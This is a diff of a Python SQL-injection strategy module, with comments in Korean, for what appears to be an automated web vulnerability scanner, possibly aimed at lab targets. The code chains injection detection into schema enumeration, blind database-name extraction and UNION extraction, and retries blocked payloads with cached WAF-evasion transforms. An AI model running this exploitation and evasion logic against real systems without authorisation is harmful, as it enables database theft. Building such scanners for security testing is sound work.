@@ -10,24 +10,18 @@ from fbs.inference.compare import visible_text, diff_score
 from fbs.inference.sql_dialects import SQL_DIALECTS, DIALECT_PROBE_ORDER, detect_db_from_error, extract_error_snippet
 from fbs.inference.strategies.base import BaseStrategy
 
-"""
-web_scanner/pipelines/sqli.py를 포팅한 SQLi strategy.
+"""SQLi 탐지 전략.
 
-원본은 Scrapy 콜백 체인(yield Request(callback=...))으로 짜여 있었지만,
-여기서는 InferenceEngine이 크롤링이 끝난 뒤 동기적으로 requests.Session을
-돌리는 구조에 맞춰 콜백 체인을 순차 호출로 펼쳐서 옮겼다. 페이로드·판정
-로직·전체 시퀀스는 원본과 동일하다.
+InferenceEngine이 크롤링을 끝낸 뒤 requests.Session으로 동기 실행한다. breaking 문자는
+recon이 찾아낸 문맥(surface.extra['quote_char'])을 물려받아 쓰고, 신호가 없으면 홑따옴표(')를
+기본값으로 쓴다.
 
-원본은 항상 '(홑따옴표)만 breaking 문자로 썼지만, 여기서는 recon이 찾아낸
-문맥(surface.extra['quote_char'])을 그대로 물려받아 전체 페이로드를 구성한다.
-recon 신호가 없으면(quote_char=None) 기존과 동일하게 '를 기본값으로 쓴다.
-
-시퀀스 (앞 단계에서 확정되면 뒤는 건너뜀. quote_probe/error_time의 status-only 약한
-신호는 즉시 확정하지 않고 보류했다가, 끝까지 아무것도 안 잡히면 최후 수단으로 씀):
-  baseline → quote_probe → [arithmetic(숫자형)] → noise+boolean(저렴함, 우선 시도)
+시퀀스(앞 단계에서 확정되면 뒤는 건너뛴다. quote_probe/error_time의 status-only 약한 신호는
+바로 확정하지 않고 보류했다가, 끝까지 아무것도 안 잡히면 최후 수단으로 쓴다):
+  baseline → quote_probe → [arithmetic(숫자형)] → noise+boolean(저렴해서 먼저 시도)
   → error/time(DB별 순차, boolean이 실패했을 때만) → [status-only fallback]
-확정 후 공격벡터 확인:
-  enumerate(ORDER BY 컬럼수 + error 기반 DB명→테이블→컬럼)
+확정 후 공격 벡터 확인:
+  enumerate(ORDER BY 컬럼 수 + error 기반 DB명→테이블→컬럼)
   → Boolean-based로 잡혔으면 이진 탐색으로 database() blind 추출
   → [union reflect] → [union extract]
 """
@@ -45,18 +39,17 @@ class SQLiStrategy(BaseStrategy):
     # blind 이진 탐색용 문자 후보 (DB/테이블/컬럼 식별자는 보통 이 범위 안이라 32~126 전체보다 좁게 잡음).
     BLIND_CHARSET  = sorted(ord(c) for c in string.ascii_letters + string.digits + '_')
     BLIND_MAX_LEN  = 64
-    # BETWEEN 기반 밴-안전 비교의 상한 — LENGTH/ASCII 값은 이보다 훨씬 작아 'x > n'을
-    # 부등호 없이 'x BETWEEN n+1 AND 이 값'으로 표현할 수 있다('<'/'>'가 밴인 타깃 대응).
+    # BETWEEN 비교의 상한. '<'·'>'가 밴일 때 x > n을 x BETWEEN n+1 AND 이 값으로 바꿔 쓰는데,
+    # LENGTH/ASCII 값은 이 상한보다 훨씬 작아 안전하다.
     BLIND_MAX_INT  = 4294967295
 
     # boolean 탐지에서 한 번에 동시 전송할 (true, false) 쌍 개수. 배치 안은 병렬, 배치 사이는
     # 순차라서 신호를 찾으면 다음 배치로 안 넘어간다 — early-stop을 배치 단위로만 유지한다.
     BOOLEAN_BATCH_SIZE = 4
 
-    # time-based로 확정됐을 때 db_name(_db_payloads의 키)에서 (방언, 연결어, 시간함수 종류)를
-    # 뽑는 표. 시간 기반 blind 추출이 어떤 방언·연결어·지연함수로 조건부 지연을 만들지 정하는 데
-    # 쓴다. 방언은 SQL_DIALECTS의 키와 동일 표기 — SQLite엔 지연함수가 없어 여기 없고, MSSQL/
-    # Oracle은 SQL_DIALECTS(문자 추출 문법)에 없어 추출은 스킵되지만 방언 표시용으로 남겨둔다.
+    # time-based로 확정됐을 때 db_name에서 (방언, 연결어, 지연함수)를 뽑는 표. 시간 기반 blind
+    # 추출이 어떤 지연함수로 조건부 지연을 만들지 정할 때 쓴다. SQLite는 지연함수가 없어 빠졌고,
+    # MSSQL/Oracle은 문자 추출 문법이 없어 추출은 건너뛰지만 방언 표시용으로 남겨둔다.
     _TIME_PROFILE = {
         'MySQL_OR':            ('MySQL',      'OR',  'sleep'),
         'MySQL_AND':           ('MySQL',      'AND', 'sleep'),
@@ -67,40 +60,31 @@ class SQLiStrategy(BaseStrategy):
         'Oracle':              ('Oracle',     'AND', 'dbms_pipe'),
     }
 
-    # 멱등성 프로브: 같은 benign 요청을 몇 번 순차로 보내 statefulness/노이즈를 재는지.
-    # 5로 잡은 이유 — 로그인 폼의 '5회 실패 후 리셋' 같은 누적 상태 임계값을 실제로 넘겨봐야
-    # 상태 전이가 드러나기 때문(2회로는 카운터가 신선할 때 0으로만 보임).
+    # 같은 정상 요청을 몇 번 보내 statefulness/노이즈를 재는지. 5로 잡은 건 로그인 폼의 5회 실패 후
+    # 리셋 같은 누적 임계값을 실제로 넘겨봐야 상태 변화가 드러나기 때문이다(2회면 카운터가 0으로만 보인다).
     IDEMPOTENCY_PROBES = 5
-    # 첫 응답 대비 최대 diff가 이 값을 넘으면 stateful(비멱등)로 본다. _probe_boolean이 이미
-    # 쓰던 '너무 시끄러움' 바(30)와 동일 — 정상 세션토큰 잡음은 보통 그 아래, 페이지 전체가
-    # 다른 페이지로 바뀌는 상태 전이는 그 위.
+    # 첫 응답 대비 최대 diff가 이 값을 넘으면 stateful(비멱등)로 본다. 정상 세션토큰 잡음은 보통
+    # 30 아래고, 페이지가 통째로 바뀌는 상태 전이는 그 위라서 30을 경계로 잡았다.
     STATEFUL_NOISE_THRESHOLD = 30
 
     def __init__(self, session: requests.Session | None = None):
         self.session = session or requests.Session()
-        # (surface.url, surface.param, payload_shape) -> 최근 성공한 EVASION_TRANSFORMS 기법
-        # 이름. 같은 필드라도 payload_shape(quote/boolean/error-time/blind/fingerprint 등)에
-        # 따라 페이로드 구조 자체가 달라서(따옴표 단독 vs AND/OR 대칭쌍 vs SLEEP 서브쿼리)
-        # 같은 우회 기법이라도 통하는지 여부가 갈릴 수 있다 — field 단위로만 캐싱하면 boolean
-        # 에서 배운 기법이 error/time에 잘못 재사용되거나(실패), 반대로 재사용 자체를 못 해서
-        # 비효율이 생긴다. shape별로 따로 캐싱해야 "이 필드의 이 종류 페이로드엔 이 기법"이라는
-        # 정확한 학습이 된다.
+        # (surface.url, surface.param, payload_shape) -> 최근 성공한 EVASION_TRANSFORMS 기법 이름.
+        # 같은 필드라도 payload_shape(quote/boolean/error-time/blind 등)에 따라 페이로드 구조가
+        # 달라서(따옴표 단독 vs AND/OR 대칭쌍 vs SLEEP 서브쿼리) 통하는 우회 기법이 갈린다. 그래서
+        # 필드가 아니라 shape별로 캐싱해야 boolean에서 배운 기법을 error/time에 잘못 재사용하지 않는다.
         self._evasion_cache: dict[tuple, str] = {}
         # (surface.url, surface.param) -> blind 추출에서 확인된 DB 방언 이름
         # (SQL_DIALECTS의 키). 필드당 한 번만 판별하고 이후 재사용한다.
         self._dialect_cache: dict[tuple, str] = {}
-        # (surface.url, surface.param) -> quote_char가 이 필드에서 우회 불가로 확인됐는지.
-        # run()의 quote/boolean/error-time 체인이 확정한 값을 여기 기록해두면, 이후
-        # _go_enumerate 쪽(UNION reflect 등)에서도 "quote_char는 이미 우회 안 된다"는 걸
-        # 참고할 수 있다 — 단, 여기서도 각 단계는 자기 자신의 첫 시도는 반드시 직접 해보고,
-        # 그것도 실패했을 때만(이 값 + 자기 확인, 두 증거가 겹칠 때만) 나머지를 스킵한다.
+        # (surface.url, surface.param) -> 이 필드에서 quote_char가 우회 불가로 확인됐는지.
+        # run()의 quote/boolean/error-time 체인이 확정한 값을 기록해두면 _go_enumerate(UNION reflect
+        # 등)에서도 참고한다. 단 각 단계는 자기 첫 시도는 직접 해보고, 그것까지 실패했을 때만 스킵한다.
         self._quote_signal: dict[tuple, bool] = {}
-        # (surface.url, surface.param) -> scanner.py가 hidden_param 발견 당시 WAF 차단을
-        # 우회하는 데 썼던 EVASION_TRANSFORMS 기법 이름(profiler가 surface.extra
-        # ['discovery_evasion']으로 넘겨줌). shape별 _evasion_cache가 아직 비어있는
-        # 첫 차단 시점에 전체 탐색 대신 이 기법부터 1번 시도해보는 용도 — 발견 당시
-        # 페이로드가 sqli.py의 특정 payload_shape와 정확히 안 맞을 수 있어서 shape별로는
-        # 못 넣고 필드 단위로만 넣어둔다.
+        # (surface.url, surface.param) -> scanner.py가 hidden_param을 발견할 때 WAF 차단을 뚫은
+        # EVASION_TRANSFORMS 기법 이름(profiler가 surface.extra['discovery_evasion']로 넘긴다).
+        # _evasion_cache가 아직 빈 첫 차단 때 전체 탐색 대신 이 기법부터 시도한다. 발견 당시 페이로드가
+        # 특정 payload_shape와 안 맞을 수 있어 shape별이 아니라 필드 단위로만 넣어둔다.
         self._discovery_evasion_hint: dict[tuple, str] = {}
         # (surface.url, surface.method) -> (stateful, page_noise, trace). 멱등성 프로브 결과를
         # 엔드포인트 단위로 캐싱한다 — statefulness는 필드가 아니라 엔드포인트의 성질이라 같은
@@ -185,18 +169,15 @@ class SQLiStrategy(BaseStrategy):
         waf_hits: list[str] = []
         waf_evasions: list[str] = []
 
-        # quote_char(따옴표) 자체가 이 필드에서 우회 불가로 확인되면(quote probe든, boolean/
-        # error-time의 첫 quote 포함 페이로드든) 이후 quote_char를 담은 페이로드는 결과가
-        # 뻔해서(EVASION_TRANSFORMS·조합 전부 이미 시도해봤자 또 막힘) 요청 자체를 안 보내고
-        # 스킵한다. run() 하나(필드 하나) 안에서만 유효한 상태라 지역 dict로 스레딩한다.
+        # 이 필드에서 quote_char(따옴표)가 우회 불가로 확인되면, 이후 quote_char가 든 페이로드는
+        # 또 막힐 게 뻔해서 요청을 안 보내고 스킵한다. run() 하나(필드 하나) 안에서만 유효한
+        # 상태라 지역 dict로 넘긴다.
         quote_signal = {'hopeless': False}
 
         vuln_entry = None
-        # hidden_param은 크롤링 때 실제 값을 본 적이 없어서(_base_fields가 항상 'test'로
-        # 채움) 원본 값 기반 판별(quote_probe 이하 체인)보다 먼저, 원본 값 없이도 숫자형
-        # 여부를 확인할 수 있는 괄호 짝 문법 비대칭 테스트를 우선 시도한다. 숫자형+SQL
-        # 파싱으로 확정되면 quote_probe/boolean 같은 문자열 지향 탐지는 방향 자체가
-        # 틀려서 생략하고 바로 이 결과를 채택한다.
+        # hidden_param은 크롤링 때 실제 값을 못 봐서(_base_fields가 늘 'test'로 채운다) 원본 값
+        # 기반 판별보다, 원본 값 없이도 숫자형인지 보는 괄호 짝 비대칭 테스트를 먼저 한다. 숫자형으로
+        # 확정되면 문자열 지향 탐지(quote_probe/boolean)는 방향이 틀려서 건너뛰고 이 결과를 쓴다.
         if surface.surface_type == 'hidden_param':
             vuln_entry = self._probe_hidden_syntax_break(surface, base_fields, waf_hits, waf_evasions)
             if vuln_entry:
@@ -206,12 +187,10 @@ class SQLiStrategy(BaseStrategy):
         if vuln_entry is None:
             vuln_entry = _confirm(self._probe_quote(surface, base_fields, baseline_status, baseline_body, quote_char, waf_hits, waf_evasions, quote_signal))
 
-        # quote_probe 성공 여부와 무관하게 숫자형 재확인은 항상 시도한다 — 따옴표 하나는
-        # 숫자형 unquoted 컨텍스트도 깨뜨려서(id = ' 도 문법 오류), quote_probe "성공"이
-        # 문자열형 컨텍스트라는 증거는 못 된다. arithmetic이 성공하면(등가성 비교라 더
-        # 구체적인 증거) 존재 확정 자체는 그대로 유지한 채 컨텍스트 판정만 arithmetic
-        # 쪽으로 교체한다 — 안 그러면 실제 숫자형 필드가 문자열형으로 잘못 확정돼
-        # 이후 %{quote_char} 접두사가 붙은 페이로드가 전부 깨진 채로 나간다.
+        # quote_probe 성공 여부와 상관없이 숫자형 재확인은 항상 한다 — 따옴표 하나는 숫자형
+        # 컨텍스트(id = ')도 깨뜨려서 quote_probe 성공이 문자열형이라는 증거가 못 된다. arithmetic이
+        # 성공하면(등가 비교라 더 확실) 존재 확정은 두고 컨텍스트 판정만 교체한다. 안 그러면 숫자형
+        # 필드가 문자열형으로 잘못 확정돼 이후 %{quote_char} 접두사 페이로드가 전부 깨진다.
         if str(original_value).isdigit():
             arithmetic_entry = self._probe_arithmetic(surface, base_fields, baseline_body, original_value)
             if arithmetic_entry:
@@ -219,10 +198,9 @@ class SQLiStrategy(BaseStrategy):
                     arithmetic_entry['detected_db'] = vuln_entry['detected_db']
                 vuln_entry = arithmetic_entry
 
-        # boolean이 error/time보다 훨씬 저렴하고(SLEEP 대기 없음), 여기서 잡히면 이진 탐색
-        # 추출까지 바로 붙는다 — 그래서 먼저 시도한다. 다만 stateful 타깃에선 참/거짓 본문
-        # 차이가 SQL 평가가 아니라 앱 상태(카운터/리셋/해커 감지)에서 나와 신뢰 불가라, boolean을
-        # 건너뛰고 상태와 무관한 물리 오라클(error/time)로 직행한다.
+        # boolean이 error/time보다 훨씬 저렴하고(SLEEP 대기 없음) 잡히면 이진 탐색 추출까지 바로
+        # 붙어서 먼저 시도한다. 단 stateful 타깃에선 참/거짓 본문 차이가 SQL 평가가 아니라 앱
+        # 상태(카운터/리셋)에서 나와 못 믿으니, boolean을 건너뛰고 상태와 무관한 error/time으로 직행한다.
         if vuln_entry is None and stateful:
             print(f"    [Stateful] 타깃이 stateful(trace={idem_trace}) — content 기반 boolean 탐지는 "
                   f"신뢰 불가라 스킵, error/time으로 직행")
@@ -246,66 +224,49 @@ class SQLiStrategy(BaseStrategy):
         vuln_entry['waf_evasions'] = waf_evasions
         vuln_entry['stateful'] = stateful
         vuln_entry['idem_trace'] = idem_trace
-        # quote_probe/boolean/arithmetic 중 dialect를 못 알아낸 경로로 확정됐으면
-        # (detected_db가 비어있거나 'Unknown') recon이 이미 알아낸 값으로 채워서,
-        # _blind_extract_boolean의 _resolve_dialect가 known_db로 재사용해 재프로빙을
-        # 건너뛸 수 있게 한다.
+        # dialect를 못 알아낸 경로로 확정됐으면(detected_db가 없거나 'Unknown') recon이 찾아둔 값으로
+        # 채워서, _resolve_dialect가 재프로빙 없이 재사용하게 한다.
         if known_dialect and vuln_entry.get('detected_db') in (None, 'Unknown'):
             vuln_entry['detected_db'] = known_dialect
-        # _go_enumerate(UNION reflect 등)가 참고할 수 있게, 여기까지 확정된 quote_char
-        # hopeless 여부를 필드별 상태로 넘겨둔다 — arithmetic/fallback으로 확정된 경우
-        # quote_char는 한 번도 안 통했을 수 있는데, _go_enumerate의 probe들은 여전히
-        # quote_char를 쓰기 때문이다.
+        # _go_enumerate(UNION reflect 등)가 참고하게 quote_char hopeless 여부를 필드별 상태로 넘긴다 —
+        # arithmetic/fallback으로 확정되면 quote_char는 한 번도 안 통했을 수 있는데 _go_enumerate의
+        # probe는 여전히 quote_char를 쓰기 때문이다.
         self._quote_signal[(surface.url, surface.param)] = quote_signal['hopeless']
 
-        # 필드가 숫자형(_probe_arithmetic 또는 _probe_hidden_syntax_break)으로 확정됐으면,
-        # 이후 열거/추출 페이로드는 따옴표로 문자열을 깨고 나오는 접두사(%')가 아니라
-        # 순수 숫자 필러를 써야 한다 — 숫자형 필드에 굳이 따옴표를 붙이면 그 자체가 불필요한
-        # 구조라 WAF가 따옴표 하나만 보고 차단하는 규칙이 있을 때(흔한 패턴) 우회 기법을
-        # 아무리 시도해도(EVASION_TRANSFORMS는 공백/대소문자 등만 바꾸지 따옴표 자체를
-        # 없애주진 않는다) 절대 못 뚫는다. _probe_arithmetic으로 확정됐으면 실제로 검증된
-        # original_value를, _probe_hidden_syntax_break로 확정됐으면 그 probe가 이미 정상
-        # 응답을 확인해둔 '9'를 필러로 재사용한다.
+        # 필드가 숫자형으로 확정됐으면 이후 열거/추출 페이로드는 따옴표 접두사(%')가 아니라 순수
+        # 숫자 필러를 써야 한다 — 숫자형에 따옴표를 붙이면 불필요한 구조라, 따옴표 하나만 보고
+        # 차단하는 WAF가 있으면 우회 기법(공백·대소문자만 바꿀 뿐 따옴표를 없애진 못한다)으로도 못
+        # 뚫는다. arithmetic이면 검증된 original_value를, syntax_break면 정상 응답을 확인한 9를 쓴다.
         enum_baseline_status, enum_baseline_body = baseline_status, baseline_body
         if vuln_entry['type'].startswith('Arithmetic-based SQL Injection'):
             numeric_filler = str(original_value) if str(original_value).isdigit() else '9'
             injection_prefix = numeric_filler
             print(f"    [SQLi] 숫자형 컨텍스트로 확정 — 이후 페이로드는 따옴표 없이 "
                   f"원시 숫자 접두사({injection_prefix!r})를 씀")
-            # _probe_arithmetic/_probe_hidden_syntax_break 둘 다 확정 페이로드에 comment를
-            # 전혀 안 쓰고도 성공했다 — 인젝션 지점 뒤에는 원래 아무것도 안 남는다는 뜻이라,
-            # dialect도 comment 없이 판별해서 comment 자체가 필요 없다는 걸 같이 증명한다.
+            # 두 probe 다 comment 없이 확정에 성공했다 — 인젝션 지점 뒤에 원래 아무것도 안 남는다는
+            # 뜻이라, dialect도 comment 없이 판별해 comment 자체가 필요 없음을 같이 보인다.
             comment, fresh_status, fresh_body = self._probe_numeric_comment(
                 surface, base_fields, injection_prefix, vuln_entry, waf_hits, waf_evasions,
             )
-            # _go_enumerate의 baseline도 이 fresh 응답으로 바꾼다 — 맨 처음 캡처한
-            # baseline_body는 placeholder('test')로 받은 거라, level처럼 따옴표 없이 그대로
-            # 꽂히는 숫자형 컬럼에서는 'test'가 존재하지 않는 컬럼 참조로 파싱돼 그 자체가
-            # 에러 응답일 수 있다(baby-sqlite에서 실제 확인: level=test → "no such column:
-            # test" → "Error!"). 그 stale하고 잠재적으로 이미 깨진 baseline과 비교하면
-            # ORDER BY 등의 판정이 통째로 뒤집힌다. injection_prefix 단독 응답(확실히 유효한
-            # 값)이 있으면 그걸로 교체하고, 못 구했으면(fresh_status is None) 안전하게 기존
-            # 것을 유지한다.
+            # _go_enumerate의 baseline도 이 fresh 응답으로 바꾼다 — 처음 캡처한 baseline_body는
+            # placeholder(test)로 받은 거라, 숫자형 컬럼에서는 test가 존재하지 않는 컬럼 참조로 파싱돼
+            # 그 자체가 에러 응답일 수 있다. 이미 깨진 baseline과 비교하면 ORDER BY 판정이 통째로
+            # 뒤집힌다. injection_prefix 단독 응답이 있으면 그걸로 교체하고, 못 구했으면 기존 것을 유지한다.
             if fresh_status is not None:
                 enum_baseline_status, enum_baseline_body = fresh_status, fresh_body
             else:
                 print(f"    [SQLi] fresh baseline 확보 실패 — 기존 placeholder 기반 baseline 유지(신뢰도 낮을 수 있음)")
         else:
             triggering = vuln_entry.get('true_payload') or vuln_entry.get('payload', '')
-            # %는 LIKE 패턴 컨텍스트(검색창 등)에서나 필요한 관례일 뿐, 이 필드가 등호(=)
-            # 비교처럼 %없이도 이미 확정됐다면 % 자체가 불필요한 문자다. %를 무조건 붙이면,
-            # %가 필터링되는 사이트(이 세션에서 실제로 발견: SQL_BAN_LIST에 %가 있는 앱)에서
-            # 확정 이후의 모든 enumerate/blind 페이로드가 전부 필터에 걸려서 매번 같은 거부
-            # 응답만 받게 된다(실측: order_results 전부 동일값, 캘리브레이션 diff=0으로
-            # 헛돎). 확정에 실제로 성공한 페이로드가 %로 시작했는지를 그대로 재사용한다 —
-            # quote_probe/error_time 등 %를 아예 안 쓰는 경로로 확정된 경우도 이걸로 커버됨.
+            # %는 LIKE 패턴(검색창 등)에서나 필요한 관례라, 등호(=) 비교처럼 %없이 확정된 필드엔
+            # 불필요한 문자다. %를 무조건 붙이면 %가 필터링되는 사이트에선 확정 이후 enumerate/blind
+            # 페이로드가 전부 걸려 같은 거부 응답만 받는다. 그래서 확정에 성공한 페이로드가 %로
+            # 시작했는지를 그대로 재사용한다 — %를 안 쓰는 경로(quote_probe/error_time)도 이걸로 커버된다.
             injection_prefix = quote_char if not triggering.startswith('%') else f"%{quote_char}"
-            # 확정 페이로드가 실제로 어떤 comment로 성공했는지(--, #) 그대로 재사용한다 —
-            # 어느 쪽인지 확인 안 되면 3개 방언(SQLite/MySQL/PostgreSQL) 공통인 --를 기본값
-            # 으로 쓴다(#는 MySQL 전용이라 다른 방언에서 그 자체가 구문 오류를 낼 수 있다).
-            # MySQL은 --가 뒤에 공백(또는 제어문자)이 없으면 주석으로 인식하지 않으므로
-            # ('-- '와 '--foo'는 다르게 취급됨), comment 값 자체에 공백을 포함시켜서 어느
-            # 호출부에서 갖다 써도 항상 안전하게 만든다.
+            # 확정 페이로드가 어떤 comment(--, #)로 성공했는지 그대로 재사용한다 — 확인이 안 되면
+            # 여러 방언 공통인 --를 기본값으로 쓴다(#는 MySQL 전용이라 다른 방언에선 구문 오류를 낼 수
+            # 있다). MySQL은 -- 뒤에 공백이 없으면 주석으로 안 보므로, comment 값에 공백을 포함해 어디서
+            # 갖다 써도 안전하게 만든다.
             stripped = triggering.rstrip()
             if stripped.endswith('--'):
                 comment = '-- '
@@ -322,9 +283,9 @@ class SQLiStrategy(BaseStrategy):
 
     @classmethod
     def _clean_dialect(cls, vuln_entry: dict) -> str | None:
-        """vuln_entry['detected_db']를 사람이 읽을 깔끔한 방언 이름으로 정규화한다 —
-        time-based의 변형 이름('MySQL_OR_BENCHMARK'→'MySQL')과 fingerprint의 '(추정)'
-        꼬리표를 걷어낸다. 판별된 게 없거나 'Unknown'이면 그대로 둔다."""
+        """vuln_entry['detected_db']를 사람이 읽기 좋은 방언 이름으로 정규화한다 — time-based 변형
+        이름(MySQL_OR_BENCHMARK→MySQL)과 fingerprint의 (추정) 꼬리표를 걷어낸다. 판별된 게 없거나
+        Unknown이면 그대로 둔다."""
         raw = vuln_entry.get('detected_db') or ''
         profile = cls._TIME_PROFILE.get(raw)
         if profile:
@@ -508,15 +469,15 @@ class SQLiStrategy(BaseStrategy):
 
     @staticmethod
     def _payload_shape(label: str) -> str:
-        """label에서 페이로드 '종류'만 뽑는다 — 'error/time(MySQL_OR)' → 'error/time',
-        'boolean(true)'/'boolean(verify-true)' → 'boolean' 등. 캐시 키를 필드 단위가
-        아니라 (필드, 종류) 단위로 좁히는 데 쓴다."""
+        """label에서 페이로드 종류만 뽑는다 — error/time(MySQL_OR) → error/time,
+        boolean(true)/boolean(verify-true) → boolean 등. 캐시 키를 필드 단위가 아니라
+        (필드, 종류) 단위로 좁히는 데 쓴다."""
         return label.split('(')[0]
 
     def _banned_in(self, surface, payload: str) -> str | None:
-        """payload에 이 필드에서 밴으로 확인된 토큰(recon filter_map)이 있으면 그 토큰을 반환.
-        앱 필터가 보통 그렇듯 소문자 substring 매칭으로 본다(앱의 `banned in query.lower()`와
-        같은 의미) — 그래야 'order'가 어디에 있든 잡히는 앱 동작과 일치한다."""
+        """payload에 이 필드에서 밴으로 확인된 토큰(recon filter_map)이 있으면 그 토큰을 반환한다.
+        앱 필터가 보통 그렇듯 소문자 substring으로 본다 — 그래야 order 같은 토큰이 어디에 있든
+        잡는 앱 동작과 일치한다."""
         banned = self._banned_tokens.get((surface.url, surface.param))
         if not banned:
             return None
@@ -527,19 +488,17 @@ class SQLiStrategy(BaseStrategy):
         return None
 
     def _is_refused(self, surface, payload: str, status, body: str) -> bool:
-        """이 응답이 '서버가 우리 페이로드를 거부/필터한 것'인지 판정한다 — 벤(recon가 학습)과
-        WAF를 한 기준으로 통합한 단일 거부 판정.
+        """이 응답이 서버가 우리 페이로드를 거부/필터한 것인지 판정한다 — 밴(recon 학습)과 WAF를
+        한 기준으로 통합한 단일 거부 판정.
 
-          1) payload에 밴 토큰(recon filter_map)이 있으면 → 앱의 substring 필터가 SQL 실행 전에
-             무조건 발동하므로 확실한 거부.
+          1) payload에 밴 토큰(recon filter_map)이 있으면 → 앱 substring 필터가 SQL 실행 전에
+             발동하므로 확실한 거부.
           2) 벤더 시그니처/rate-limit(classify_waf_block의 강한 판정)이면 → 확실한 WAF 차단.
 
-        그 외(밴 토큰 없음 + 벤더 시그니처 아님)는 거부로 단정하지 '않는다'. 예전엔 제네릭 키워드
-        ('hack' 등) 단독 매치를 길이 비교로 재검증했는데(1811 vs 1831 해킹), 거부 페이지가 성공/
-        정상 페이지와 거의 같은 앱에서는 성공 응답까지 '차단'으로 오인해 신호를 잃었다.
-        밴은 filter_map으로 이미 정확히 알고, 진짜 인프라 WAF는 벤더 시그니처로 잡히므로, 애매한
-        제네릭 판정은 무시하는 게 오탐이 적다(거부지문은 recon의 밴 학습에만 쓰고 여기선 안 쓴다 —
-        거부==성공 페이지인 앱은 지문으로도 이 둘을 못 가르기 때문)."""
+        그 외는 거부로 단정하지 않는다. 제네릭 키워드(hack 등) 단독 매치를 길이로 재검증하던
+        방식은, 거부 페이지가 성공 페이지와 거의 같은 앱에선 성공 응답까지 차단으로 오인해 신호를
+        잃었다. 밴은 filter_map으로 정확히 알고 진짜 WAF는 벤더 시그니처로 잡히니, 애매한 제네릭
+        판정은 무시하는 게 오탐이 적다."""
         if self._banned_in(surface, payload) is not None:
             return True
         blocked, name, _ = classify_waf_block(status, body)
@@ -549,26 +508,19 @@ class SQLiStrategy(BaseStrategy):
                     dialect: str | None = None, quiet: bool = False):
         """payload가 WAF에 막혔을 때 우회 변형들을 재시도한다.
 
-        같은 필드·같은 payload_shape((surface.url, surface.param, shape))에서 최근에
-        성공했던 기법이 있으면 그것 하나만 먼저 시도한다(요청 1개) — blind 추출처럼 같은
-        모양의 페이로드를 수십~수백 번 보내는 구간에서, 매번 EVASION_TRANSFORMS 전체를
-        재탐색하지 않아도 되게 하기 위함. shape까지 키에 포함시킨 이유는, boolean 단계에서
-        통했던 기법(예: inline_comment)이 error/time처럼 구조가 다른 페이로드(SLEEP 서브쿼리
-        등)엔 안 통할 수 있어서 — field 단위로만 캐싱하면 이런 경우 "캐시 시도 실패 → 결국
-        전체 재탐색"이 되어 캐싱 효과가 없다.
+        같은 필드·같은 payload_shape에서 최근 성공한 기법이 있으면 그것 하나만 먼저 시도한다(요청
+        1개) — blind 추출처럼 같은 모양 페이로드를 수백 번 보내는 구간에서 매번 전체를 재탐색하지
+        않기 위해서다. shape까지 키에 넣은 건, boolean에서 통한 기법이 error/time처럼 구조가 다른
+        페이로드엔 안 통할 수 있어서다(필드 단위로만 캐싱하면 캐시 효과가 없다).
 
-        캐시된 기법이 실패하면(다른 필터 규칙에 걸린 경우) waf.try_evade로 전체를 다시
-        훑되, 방금 실패한 그 기법은 skip으로 넘겨서 중복 시도를 피한다. 새로 찾은 기법으로
-        캐시를 갱신한다 — 정확도는 기존과 동일하게 유지되고, 반복 상황에서만 빨라진다.
-
-        dialect(blind 추출에서 확인된 DB 방언)는 waf.try_evade에 그대로 넘겨서, SQLite
-        엔 안 통하는 substr_no_comma 같은 방언 전용 기법이 걸러지게 한다.
+        캐시된 기법이 실패하면 전체를 다시 훑되 방금 실패한 기법은 skip으로 넘겨 중복을 피하고,
+        새로 찾은 기법으로 캐시를 갱신한다. dialect는 try_evade에 넘겨 SQLite엔 안 통하는
+        substr_no_comma 같은 방언 전용 기법이 걸러지게 한다.
         """
-        # payload에 밴 토큰(recon filter_map)이 있는데 우리 우회 변형 중 그 토큰을 실제로 없애는
-        # 게 하나도 없으면(order/union/database 같은 키워드 substring 밴 — 공백/대소문자 변형으론
-        # 못 지움), 우회는 무의미하니 요청을 낭비하지 않고 바로 실패 처리한다. 우회는 '구조적
-        # WAF'(공백/키워드 경계 기반)용이지 키워드 밴용이 아니다 — 키워드 밴은 페이로드 자체를
-        # 밴 없는 형태로 바꿔야(다음 단계) 뚫린다.
+        # payload에 밴 토큰이 있는데 우리 우회 변형 중 그 토큰을 실제로 없애는 게 하나도 없으면
+        # (order/union/database 같은 substring 밴은 공백·대소문자 변형으론 못 지운다), 우회가 무의미
+        # 하니 요청을 낭비하지 않고 바로 실패 처리한다. 우회는 구조적 WAF(공백·키워드 경계)용이지
+        # 키워드 밴용이 아니다 — 키워드 밴은 페이로드 자체를 밴 없는 형태로 바꿔야 뚫린다.
         banned = self._banned_in(surface, payload)
         if banned and not any(banned not in transform(payload).lower() for _, transform in EVASION_TRANSFORMS):
             if not quiet:
@@ -580,9 +532,8 @@ class SQLiStrategy(BaseStrategy):
         cached_name = self._evasion_cache.get(key)
         tried_and_failed = None
         if cached_name:
-            # apply_named_evasion은 단일 기법 이름('inline_comment')과 조합 이름
-            # ('inline_comment+case_mix')을 둘 다 처리한다 — 캐시에 조합이 들어있어도
-            # 여기서 못 알아보고 매번 전체 탐색으로 새는 일이 없다.
+            # apply_named_evasion은 단일 기법 이름(inline_comment)과 조합 이름(inline_comment+case_mix)을
+            # 둘 다 처리한다 — 캐시에 조합이 들어있어도 못 알아보고 매번 전체 탐색으로 새는 일이 없다.
             variant = apply_named_evasion(cached_name, payload)
             if variant != payload:
                 status, body, elapsed = self._send(surface, {**base_fields, surface.param: variant})
@@ -594,13 +545,10 @@ class SQLiStrategy(BaseStrategy):
                         return status, body, elapsed, variant
                 tried_and_failed = cached_name
 
-        # 이 shape의 캐시가 아직 비어있으면(=이 필드에서 이 shape로는 처음 차단당함),
-        # scanner.py가 hidden_param 발견 당시 이미 확인해둔 우회 기법이 있는지 본다 —
-        # discovery 당시 페이로드는 이 shape와 구조가 다를 수 있어 확실하지 않지만,
-        # 요청 1개로 시도해볼 가치는 있다. 성공하면 이 shape의 정식 캐시에도 등록해서
-        # 다음부터는 바로 캐시 히트로 처리된다. 실패해도 skip에 넣어 전체 탐색에서
-        # 중복 시도만 피하고, 이후엔 이 필드에서 다시 안 쓴다(cached_name이 비어있을
-        # 때만 도는 1회성 시도).
+        # 이 shape의 캐시가 아직 비어있으면(이 필드에서 이 shape로는 처음 차단), scanner.py가
+        # hidden_param 발견 당시 확인해둔 우회 기법이 있는지 본다 — 당시 페이로드는 이 shape와 구조가
+        # 다를 수 있어 확실치 않지만 요청 1개로 시도할 가치는 있다. 성공하면 이 shape 캐시에도 등록하고,
